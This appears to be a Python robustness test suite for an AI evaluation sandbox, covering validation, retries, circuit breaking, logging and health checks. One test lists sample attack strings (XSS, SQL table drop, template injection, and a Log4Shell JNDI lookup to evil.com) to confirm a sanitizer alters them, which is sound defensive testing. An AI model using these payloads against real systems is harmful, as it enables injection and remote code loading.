#!/usr/bin/env python3
"""
Robust validation and error handling tests
Generation 2: Make It Robust (Reliable)
"""
import sys
import os
import asyncio
import logging
from typing import Dict, Any

sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

def setup_logging():
    """Configure comprehensive logging."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('/tmp/robust_test.log', mode='w')
        ]
    )
    return logging.getLogger(__name__)

async def test_input_validation():
    """Test comprehensive input validation."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.evaluator import EvalSuite
        from agi_eval_sandbox.core.models import Model
        from agi_eval_sandbox.core.exceptions import ValidationError
        
        eval_suite = EvalSuite()
        logger.info("Testing input validation scenarios...")
        
        # Test empty model name
        try:
            model = Model(provider="test", name="", api_key="test")
            logger.warning("Empty model name should have been rejected")
            return False
        except (ValidationError, ValueError) as e:
            logger.info(f"✅ Empty model name correctly rejected: {e}")
        
        # Test invalid benchmarks
        try:
            fake_model = Model(provider="test", name="test-model", api_key="test")
            await eval_suite.evaluate(fake_model, benchmarks=["non_existent_benchmark"])
            logger.warning("Non-existent benchmark should have been rejected")
            return False
        except (ValidationError, KeyError) as e:
            logger.info(f"✅ Invalid benchmark correctly rejected: {e}")
        
        # Test negative question count
        try:
            fake_model = Model(provider="test", name="test-model", api_key="test")
            await eval_suite.evaluate(fake_model, benchmarks="truthfulqa", num_questions=-1)
            logger.warning("Negative question count should have been rejected")
            return False
        except (ValidationError, ValueError) as e:
            logger.info(f"✅ Negative question count correctly rejected: {e}")
        
        logger.info("✅ Input validation tests passed")
        return True
        
    except Exception as e:
        logger.error(f"❌ Input validation test failed: {e}")
        return False

async def test_circuit_breaker():
    """Test circuit breaker functionality."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.evaluator import CircuitBreaker, CircuitBreakerConfig
        
        # Create circuit breaker with low thresholds for testing
        config = CircuitBreakerConfig(
            failure_threshold=2,
            recovery_timeout=1,
            success_threshold=1,
            timeout=0.1
        )
        
        circuit_breaker = CircuitBreaker("test_breaker", config)
        
        # Test normal operation
        async def success_func():
            return "success"
        
        result = await circuit_breaker.call(success_func)
        if result != "success":
            logger.error("Circuit breaker failed on success case")
            return False
        
        logger.info("✅ Circuit breaker success case passed")
        
        # Test failure scenarios
        async def failing_func():
            raise Exception("Test failure")
        
        failure_count = 0
        for i in range(3):
            try:
                await circuit_breaker.call(failing_func)
            except Exception:
                failure_count += 1
        
        if failure_count >= 2:
            logger.info("✅ Circuit breaker failure handling passed")
        else:
            logger.warning(f"Expected at least 2 failures, got {failure_count}")
        
        return True
        
    except Exception as e:
        logger.error(f"❌ Circuit breaker test failed: {e}")
        return False

async def test_retry_mechanism():
    """Test retry mechanism."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.evaluator import RetryHandler, RetryConfig
        
        # Create retry handler with quick retries for testing
        config = RetryConfig(
            max_attempts=3,
            base_delay=0.01,
            max_delay=0.1,
            exponential_base=1.5
        )
        
        retry_handler = RetryHandler(config)
        
        # Test eventual success
        attempt_count = 0
        async def eventually_succeeds():
            nonlocal attempt_count
            attempt_count += 1
            if attempt_count < 3:
                raise Exception("Temporary failure")
            return "success"
        
        result = await retry_handler.execute_with_retry(eventually_succeeds)
        
        if result == "success" and attempt_count == 3:
            logger.info("✅ Retry mechanism success case passed")
        else:
            logger.error(f"Retry failed: result={result}, attempts={attempt_count}")
            return False
        
        # Test permanent failure
        attempt_count = 0
        async def always_fails():
            nonlocal attempt_count
            attempt_count += 1
            raise Exception("Permanent failure")
        
        try:
            await retry_handler.execute_with_retry(always_fails)
            logger.error("Permanent failure should have been raised")
            return False
        except Exception as e:
            if "Operation failed after" in str(e) and attempt_count >= 3:
                logger.info("✅ Retry mechanism permanent failure handling passed")
            else:
                logger.error(f"Unexpected retry behavior: {e}, attempts={attempt_count}")
                return False
        
        return True
        
    except Exception as e:
        logger.error(f"❌ Retry mechanism test failed: {e}")
        return False

def test_logging_configuration():
    """Test logging is properly configured."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.logging_config import get_logger
        
        test_logger = get_logger("test_module")
        test_logger.info("Test log message")
        test_logger.warning("Test warning message")
        test_logger.error("Test error message")
        
        logger.info("✅ Logging configuration test passed")
        return True
        
    except Exception as e:
        logger.error(f"❌ Logging configuration test failed: {e}")
        return False

def test_security_validation():
    """Test security input validation."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.validation import InputValidator
        
        validator = InputValidator()
        
        # Test dangerous input sanitization
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for dangerous_input in dangerous_inputs:
            sanitized = validator.sanitize_user_input(dangerous_input)
            if dangerous_input == sanitized:
                logger.warning(f"Input not sanitized: {dangerous_input}")
                return False
            else:
                logger.info(f"✅ Sanitized dangerous input: {dangerous_input[:20]}...")
        
        logger.info("✅ Security validation test passed")
        return True
        
    except Exception as e:
        logger.error(f"❌ Security validation test failed: {e}")
        return False

async def test_health_monitoring():
    """Test health monitoring system."""
    logger = logging.getLogger(__name__)
    
    try:
        from agi_eval_sandbox.core.health import health_monitor
        
        # Run health checks
        health_results = await health_monitor.run_all_checks()
        
        if health_results:
            logger.info(f"✅ Health monitoring active with {len(health_results)} checks")
            
            for check_name, check_result in health_results.items():
                logger.info(f"  {check_name}: {check_result.status.value} - {check_result.message}")
            
            return True
        else:
            logger.warning("No health checks configured")
            return False
        
    except Exception as e:
        logger.error(f"❌ Health monitoring test failed: {e}")
        return False

async def main():
    """Run all robust testing scenarios."""
    logger = setup_logging()
    logger.info("🛡️  Starting Generation 2 (Robust) Testing Suite")
    logger.info("=" * 60)
    
    tests = [
        ("Input Validation", test_input_validation()),
        ("Circuit Breaker", test_circuit_breaker()),
        ("Retry Mechanism", test_retry_mechanism()),
        ("Logging Configuration", lambda: test_logging_configuration()),
        ("Security Validation", lambda: test_security_validation()),
        ("Health Monitoring", test_health_monitoring())
    ]
    
    results = []
    
    for test_name, test_func in tests:
        logger.info(f"\n🔍 Running {test_name} test...")
        try:
            if asyncio.iscoroutine(test_func):
                result = await test_func
            else:
                result = test_func()
            results.append((test_name, result))
        except Exception as e:
            logger.error(f"❌ {test_name} test crashed: {e}")
            results.append((test_name, False))
    
    logger.info(f"\n{'=' * 60}")
    logger.info("📊 Generation 2 Test Results:")
    
    passed = 0
    total = len(results)
    
    for test_name, success in results:
        status = "✅ PASS" if success else "❌ FAIL"
        logger.info(f"  {test_name}: {status}")
        if success:
            passed += 1
    
    logger.info(f"\n📈 Score: {passed}/{total} tests passed ({100*passed//total}%)")
    
    if passed >= total * 0.8:  # 80% pass threshold for robust
        logger.info("🎉 Generation 2 (Make It Robust) - COMPLETE!")
        logger.info("🚀 Ready to proceed to Generation 3 (Make It Scale)")
        return True
    else:
        logger.warning("⚠️  Robustness requirements not fully met")
        return False

if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)